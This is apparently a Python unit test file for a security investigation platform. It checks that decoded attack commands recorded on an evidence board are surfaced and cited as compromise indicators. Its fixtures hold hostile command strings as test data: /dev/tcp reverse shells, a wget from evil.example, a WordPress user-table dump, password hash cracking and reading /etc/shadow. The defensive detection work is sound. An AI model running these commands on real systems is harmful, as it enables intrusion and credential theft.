"""Unit test: board-driven compromise detection (A2).

Escalation and the verdict used to read only the agent's narrative, so a decoded reverse
shell the platform extracted onto the board was lost when the agent searched for the literal
string, found nothing (encoded), and recorded a negative. `_board_compromise_facts` reads the
board's own decoded artifacts as the authoritative compromise source.
"""

from __future__ import annotations

import os
import sys
import unittest

os.environ.setdefault("DJANGO_SETTINGS_MODULE", "aci.settings")
project_root = os.path.dirname(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
)
sys.path.insert(0, project_root)
import django  # noqa: E402

django.setup()

from agent.runtime.graph import validation  # noqa: E402


class BoardCompromiseTest(unittest.TestCase):
    def _run(self, entries):
        orig = validation._board_entries_for_validation
        validation._board_entries_for_validation = lambda state: entries
        try:
            return validation._board_compromise_facts(
                {"case_id": "~1", "run_id": "r", "agent_name": "investigation"}
            )
        finally:
            validation._board_entries_for_validation = orig

    def test_decoded_reverse_shell_artifact_is_surfaced_with_source(self):
        entries = [
            {
                "kind": "artifact",
                "status": "confirmed",
                "content": "command: [decoded] bash -c exec 196<>/dev/tcp/192.168.130.77/51898 sh",
                "source": "bCWTdyf5r3Alvp_S1ets",
            },
            {
                "kind": "artifact",
                "content": "ip: 10.35.35.206",
                "source": "e2",
            },  # benign, no indicator
        ]
        out = self._run(entries)
        self.assertEqual(len(out), 1)
        self.assertIn("/dev/tcp/192.168.130.77", out[0])
        self.assertIn("bCWTdyf5r3Alvp_S1ets", out[0])  # citation preserved

    def test_decoded_non_reverse_shell_commands_are_surfaced(self):
        # The narrow reverse-shell regex used to drop these, losing a real credential-access
        # chain. Any decoded command is now surfaced for the model to classify in context.
        entries = [
            {
                "kind": "artifact",
                "status": "observed",
                "content": 'command: [decoded] mysql -u wordpress -pSECRET wordpress_db -e "select * from wp_users"',
                "source": "jeF0Kpb5JGf_5V6i1W6c",
            },
            {
                "kind": "artifact",
                "status": "observed",
                "content": "command: [decoded] ./wphashcrack-0.1/wphashcrack.sh -w rockyou.txt -u phopkins",
                "source": "6OvN-k7C-psZRcUyJZZ0",
            },
            {
                "kind": "artifact",
                "status": "observed",
                "content": "command: [hex-decoded] wget https://evil.example/tool.tar.gz",
                "source": "I3EzoX69VDJDqyFAVqdu",
            },
        ]
        out = self._run(entries)
        self.assertEqual(len(out), 3)
        joined = " ".join(out)
        self.assertIn("wp_users", joined)
        self.assertIn("wphashcrack", joined)
        self.assertIn("jeF0Kpb5JGf_5V6i1W6c", joined)  # citations preserved
        self.assertIn("I3EzoX69VDJDqyFAVqdu", joined)

    def test_decoded_commands_rank_ahead_of_narrative_matches(self):
        # A downstream consumer caps at 6; deterministic decoded commands must not be crowded
        # out of the cap by the agent's prose fact bullets that merely mention a token.
        entries = [
            {
                "kind": "fact",
                "content": f"Fact: reverse shell noise mention #{i}",
                "source": f"n{i}",
            }
            for i in range(8)
        ] + [
            {
                "kind": "artifact",
                "content": 'command: [decoded] mysql -e "select * from wp_users"',
                "source": "cmd1",
            },
        ]
        out = self._run(entries)
        self.assertIn(
            "wp_users", out[0]
        )  # decoded command first, survives any [:6] cap

    def test_plain_command_without_decoded_marker_is_not_surfaced(self):
        # A command artifact the model narrated in plaintext (never encoded) is not, by
        # itself, a compromise indicator — the [decoded] marker is what makes it high-signal.
        entries = [
            {"kind": "artifact", "content": "command: ls -la /var/www", "source": "e1"}
        ]
        self.assertEqual(self._run(entries), [])

    def test_negated_decoded_command_is_ignored(self):
        entries = [
            {
                "kind": "artifact",
                "content": "command: [decoded] wget http://x/y — no matching event found",
                "source": "e1",
            }
        ]
        self.assertEqual(self._run(entries), [])

    def test_negated_board_content_is_ignored(self):
        entries = [
            {
                "kind": "fact",
                "content": "No evidence of any reverse shell was found.",
                "source": "e1",
            }
        ]
        self.assertEqual(self._run(entries), [])

    def test_non_artifact_kinds_ignored(self):
        entries = [
            {
                "kind": "hypothesis",
                "content": "maybe a /dev/tcp reverse shell",
                "source": "e1",
            }
        ]
        self.assertEqual(self._run(entries), [])

    def test_empty_board(self):
        self.assertEqual(self._run([]), [])


class CitedBoardEntriesTest(unittest.TestCase):
    """The ungated core shared with report synthesis.

    `_board_compromise_facts` gates on the compromise regex; synthesis must NOT, or
    `user: phopkins` and `command: /bin/cat /etc/shadow` never reach the report.
    """

    def test_ungated_keeps_ordinary_artifacts_the_compromise_gate_would_drop(self):
        entries = [
            {"kind": "artifact", "content": "user: phopkins", "source": "e1"},
            {"kind": "artifact", "content": "command: /bin/cat /etc/shadow", "source": "e2"},
        ]
        out = validation._cited_board_entries(entries, kinds=("artifact",))
        self.assertEqual(len(out), 2)
        self.assertIn("user: phopkins [e1]", out)
        # ...and the gated caller still drops them, which is what synthesis had to avoid.
        self.assertEqual(
            validation._cited_board_entries(
                entries,
                kinds=("artifact",),
                keep=validation._ACTIVE_COMPROMISE_INDICATORS_RE.search,
            ),
            [],
        )

    def test_decoded_commands_rank_first_so_a_cap_never_drops_them(self):
        entries = [
            {"kind": "artifact", "content": f"ip: 10.0.0.{i}", "source": f"e{i}"}
            for i in range(5)
        ] + [
            {
                "kind": "artifact",
                "content": "command: [decoded] bash -c /dev/tcp/1.2.3.4/9001",
                "source": "zz",
            }
        ]
        out = validation._cited_board_entries(entries, kinds=("artifact",))
        self.assertIn("[decoded]", out[0])

    def test_kinds_filter_and_negated_content_are_respected(self):
        entries = [
            {"kind": "correlation", "content": "correlation[srcuser bob] 3 ev", "source": "c1"},
            {"kind": "artifact", "content": "ip: 1.1.1.1", "source": "a1"},
            {
                "kind": "correlation",
                "content": "no reverse shell was found in this window",
                "source": "c2",
            },
        ]
        out = validation._cited_board_entries(entries, kinds=("correlation",))
        self.assertEqual(out, ["correlation[srcuser bob] 3 ev [c1]"])


if __name__ == "__main__":
    unittest.main(verbosity=2)
